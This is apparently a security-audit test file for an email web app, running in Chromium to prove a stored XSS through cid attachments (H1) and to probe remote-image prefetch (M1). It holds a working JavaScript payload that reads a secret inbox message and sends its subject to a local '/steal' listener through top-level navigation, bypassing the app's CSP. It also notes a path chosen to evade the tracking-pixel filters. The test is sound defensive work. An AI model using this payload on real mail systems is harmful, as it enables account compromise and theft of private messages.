/**
 * H1 (stored XSS via attachment by-cid) and M1 (remote-image prefetch) — proven
 * in real Chromium against the real server with the real built frontend.
 *
 * H1: a sender crafts a message with two inline (cid) parts:
 *   - a text/html part, and
 *   - a part served as application/javascript.
 * /api/attachments/by-cid serves the sender's Content-Type with no
 * Content-Disposition and no X-Content-Type-Options. Navigating to the HTML
 * part renders it as a document ON THE APP ORIGIN. The CSP attached to it is
 * `script-src 'self'`, which still permits loading the sibling attachment as a
 * <script> (same origin) — so attacker JS runs on the app origin and reads the
 * mailbox via `connect-src 'self'` fetches.
 *
 * M1: tests whether building a detached element and assigning innerHTML with
 * raw email HTML (as email-sanitizer.ts / ThreadMessage.tsx do on the RAW body)
 * causes the browser to fetch remote <img> before stripping.
 */
import { serve } from "@hono/node-server";
import { chromium, type Browser } from "playwright";
import { createServer } from "node:net";
import { createServer as createHttp, type Server } from "node:http";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { createApp } from "../../src/api/server.js";
import { upsertAttachmentBlob } from "../../src/storage/attachment-storage.js";
import {
	createTestContext,
	createTestDb,
	createTestFolder,
	createTestInboundConnector,
	createTestMessage,
} from "../../src/test-helpers/test-db.js";

const CHROME = "/opt/pw-browsers/chromium-1194/chrome-linux/chrome";

async function freePort(): Promise<number> {
	return new Promise((resolve, reject) => {
		const s = createServer();
		s.listen(0, "127.0.0.1", () => {
			const a = s.address();
			if (a && typeof a === "object") { const p = a.port; s.close(() => resolve(p)); }
			else reject(new Error("no port"));
		});
	});
}

describe("H1/M1 in real Chromium", () => {
	let browser: Browser;
	let appServer: ReturnType<typeof serve>;
	let tracker: Server;
	let trackerHits: string[] = [];
	let port = 0;
	let trackerPort = 0;
	let secretMsgId = 0;

	beforeAll(async () => {
		// Seed a DB: a secret inbox message + a carrier message with two cid parts
		// + a message whose RAW html body loads a remote image.
		const db = createTestDb();
		const conn = createTestInboundConnector(db);
		const inbox = createTestFolder(db, conn, "INBOX", { name: "INBOX", specialUse: "\\Inbox" });

		secretMsgId = createTestMessage(db, conn, inbox, 1, {
			subject: "SECRET-INBOX-CONTENT-7f3a9",
			textBody: "wire the money to IBAN 00 secret",
		});

		trackerPort = await freePort();
		const carrier = createTestMessage(db, conn, inbox, 2, { subject: "carrier" });
		const jsPayload = `
			window.__xss_ran = true;
			fetch('/api/messages/${secretMsgId}').then(r=>r.json()).then(d=>{
				const pre=document.createElement('pre'); pre.id='exfil';
				pre.textContent = JSON.stringify({subject:d.subject, body:d.text_body});
				document.body.appendChild(pre);
				// connect-src 'self' blocks fetch/XHR/sendBeacon to other origins, but
				// TOP-LEVEL NAVIGATION is not restricted by this CSP (no navigate-to /
				// form-action), so the stolen data still leaves the origin.
				setTimeout(function(){
					document.location = 'http://127.0.0.1:${trackerPort}/steal?d='+encodeURIComponent(d.subject);
				}, 300);
			});`;
		const htmlPart = `<!doctype html><html><body><h1>invoice</h1>
			<script src="/api/attachments/by-cid/${carrier}/jscid"></script></body></html>`;
		const hHtml = upsertAttachmentBlob(db, Buffer.from(htmlPart, "utf8"));
		const hJs = upsertAttachmentBlob(db, Buffer.from(jsPayload, "utf8"));
		const ins = db.prepare(
			"INSERT INTO attachments (message_id, filename, content_type, size, content_id, content_hash) VALUES (?,?,?,?,?,?)",
		);
		ins.run(carrier, "invoice.html", "text/html", htmlPart.length, "htmlcid", hHtml);
		ins.run(carrier, "x.js", "application/javascript", jsPayload.length, "jscid", hJs);

		// M1 carrier: remote image with a neutral path (avoids the /track,/pixel,
		// /beacon,/open string filters) so only "block remote images" would stop it.
		createTestMessage(db, conn, inbox, 3, {
			subject: "newsletter",
			htmlBody: `<p>hi</p><img src="http://127.0.0.1:${trackerPort}/remote-img.png" width="200" height="100">`,
		});

		// Real server (serveStatic needs cwd = repo root, which vitest uses).
		port = await freePort();
		const { app } = createApp(createTestContext(db));
		appServer = serve({ fetch: app.fetch, port, hostname: "127.0.0.1" });

		trackerHits = [];
		tracker = createHttp((req, res) => { trackerHits.push(req.url ?? ""); res.writeHead(200); res.end("ok"); });
		await new Promise<void>((r) => tracker.listen(trackerPort, "127.0.0.1", () => r()));

		browser = await chromium.launch({ executablePath: CHROME });
	}, 120000);

	afterAll(async () => {
		await browser?.close();
		await new Promise<void>((r) => { try { appServer?.close(() => r()); } catch { r(); } });
		await new Promise<void>((r) => { try { tracker?.close(() => r()); } catch { r(); } });
	});

	it("H1: attacker JS runs on the app origin and reads the mailbox", async () => {
		const page = await browser.newPage();
		const headers: Record<string, string> = {};
		page.on("response", (resp) => {
			if (resp.url().endsWith("/by-cid/2/htmlcid")) Object.assign(headers, resp.headers());
		});

		await page.goto(`http://127.0.0.1:${port}/api/attachments/by-cid/2/htmlcid`, { waitUntil: "domcontentloaded" });

		// The sender-controlled Content-Type was honored, no inline-blocking headers.
		expect(headers["content-type"]).toContain("text/html");
		expect(headers["content-disposition"]).toBeUndefined();
		expect(headers["x-content-type-options"]).toBeUndefined();
		expect(headers["content-security-policy"] ?? "").toContain("script-src 'self'");

		// Read the exfil marker BEFORE the payload navigates away (300ms timer).
		const exfil = await page.locator("#exfil").textContent({ timeout: 5000 });
		expect(exfil).toContain("SECRET-INBOX-CONTENT-7f3a9"); // mailbox read from attacker JS
		const ran = await page.evaluate(() => (window as unknown as { __xss_ran?: boolean }).__xss_ran === true);
		expect(ran).toBe(true); // same-origin <script> executed despite CSP

		// The stolen subject then leaves the origin via top-level navigation.
		await new Promise((r) => setTimeout(r, 800));
		expect(trackerHits.some((u) => u.includes("/steal") && u.includes("SECRET-INBOX-CONTENT-7f3a9"))).toBe(true);
		await page.close();
	}, 60000);

	it("M1: does a detached div.innerHTML prefetch remote <img>? (empirical)", async () => {
		const page = await browser.newPage();
		await page.goto(`http://127.0.0.1:${port}/`, { waitUntil: "domcontentloaded" }).catch(() => {});
		const before = trackerHits.filter((u) => u.includes("detached-probe")).length;
		// Reproduce exactly what email-sanitizer.ts / hasRemoteImages do on RAW html:
		// a detached element (never inserted into the live document) receives innerHTML.
		await page.evaluate((tp) => {
			const div = document.createElement("div");
			div.innerHTML = `<img src="http://127.0.0.1:${tp}/detached-probe.png">`;
			// intentionally NOT appended to document
		}, trackerPort);
		await new Promise((r) => setTimeout(r, 400));
		const after = trackerHits.filter((u) => u.includes("detached-probe")).length;
		// Record the observed behavior; see FINDINGS.md for interpretation.
		console.log(`[M1] detached-innerHTML remote-img fetches observed: ${after - before}`);
		// This assertion documents the observed result (0 = no prefetch from detached node).
		expect(after - before).toBe(0);
		await page.close();
	}, 60000);
});
